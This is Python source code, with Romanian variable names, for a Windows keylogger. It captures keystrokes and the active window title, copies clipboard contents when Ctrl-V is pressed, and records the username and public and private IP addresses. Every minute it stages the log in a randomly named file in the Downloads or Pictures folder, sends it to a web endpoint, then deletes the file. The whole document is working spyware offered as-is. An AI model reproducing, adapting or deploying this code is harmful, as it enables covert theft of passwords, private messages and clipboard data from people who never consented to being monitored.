from pynput.keyboard import Key, Listener
from ctypes import *
import threading
import time
import os
import sys
import win32gui
import socket
import random
import win32clipboard
import requests
user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi

ip_public = requests.get('https://api.ipify.org').text
ip_pirvat = socket.gethostbyname(socket.gethostname())
nume_utilizator = os.path.expanduser('~').split("\\")[2]
data = time.ctime(time.time())

mesaj = f'Start mesaje\n -Data:{data}\n -Nume Utilizator:{nume_utilizator}\n -Ip Privat:{ip_pirvat}\n' \
        f'-Ip Public:{ip_public}\n '
old_app = ''
delete_file = []


class logger:
    def __init__(self):
        self.fp = os.path.dirname(os.path.realpath("__file__"))
        self.file_name = sys.argv[0].split("\\")[-1]
        self.new_file_path = self.fp + "\\" + self.file_name
        self.current_window = None
        self.info = []
        self.info.append(mesaj)
        print(self.info)
        thread = threading.Thread(target=self.dumpinfo)
        thread.start()
        with Listener(on_press=self.on_press) as listener:
            listener.join()
        self.dumpinfo()

    def on_press(self,key):
        global old_app

        new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        new_key=key
        if new_app == 'Cortana':
            new_app = 'Windows Start Menu'
        else:
            pass

        if new_app != old_app and new_app != '':
            self.info.append(f' \n [{data}] ~ {new_app}  \n')
            old_app = new_app
        else:
            pass

        substitution = ['Key.enter', '[ENTER]\n', 'Key.backspace', '[BACKSPACE]', 'Key.space', ' ',
                        'Key.alt_l', '[ALT]', 'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]',
                        'Key.left', '[LEFT ARROW]', 'Key.right', '[RIGHT ARROW]', 'Key.shift', '[SHIFT]', '\\x13',
                        '[CTRL-S]', '\\x17', '[CTRL-W]', 'Key.caps_lock', '[CAPS LK]', '\\x01', '[CTRL-A]', 'Key.cmd',
                        '[WINDOWS KEY]', 'Key.print_screen', '[PRNT SCR]', '\\x03', '[CTRL-C]', '\\x16', '[CTRL-V]']

        key = str(key).strip('\'')
        if key in substitution:

            self.info.append(substitution[substitution.index(key) + 1])
            if key == '\\x16':
                win32clipboard.OpenClipboard()
                pasted_value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                self.info.append(f' \n [Data colected from clipboard] ~ \n {pasted_value}  \n')

        else:
            self.info.append(key)



    def creare_fisier(self):
        one = os.path.expanduser('~') + '\Downloads\\'
        two = os.path.expanduser('~') + '\Pictures\\'
        list = [one, two]
        filepath = random.choice(list)
        filename = 'I' + str(random.randint(1000000, 9999999)) + '.txt'

        file = filepath + filename
        return file

    def dumpinfo(self):
        while 1 == 1:
            time.sleep(60)
            nume_fisier=self.creare_fisier()
            with open(nume_fisier, 'a') as fil:
                fil.write(''.join(self.info))
            print(self.info)
            self.sentoweb(self.info)
            os.remove(nume_fisier)
            self.info = []

    def sentoweb(self, info):
        print("datele au fost trimise: ")
        value = {'nume_utilizator': nume_utilizator, 'ip_public':ip_public,'ip_privat':ip_pirvat,'data':data,'info': info}
        r=requests.get("http://127.0.0.1:8000/send_data/",params=value)
        print(r.text)


def main():
    t = logger()


if __name__ == "__main__":
    main()